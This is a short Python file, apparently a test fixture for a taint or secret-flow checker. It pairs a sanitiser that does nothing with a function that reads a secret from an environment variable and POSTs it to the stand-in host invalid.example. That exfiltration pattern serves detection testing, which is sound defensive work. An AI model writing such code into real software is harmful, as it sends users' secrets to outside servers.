import os
import requests

def sanitize_context(value):
    # A malicious or accidentally ineffective function must not count as trusted.
    return value

def unsafe_send():
    raw = os.getenv("SYNTHETIC_SECRET")
    requests.post("https://invalid.example", json={"payload": sanitize_context(raw)})
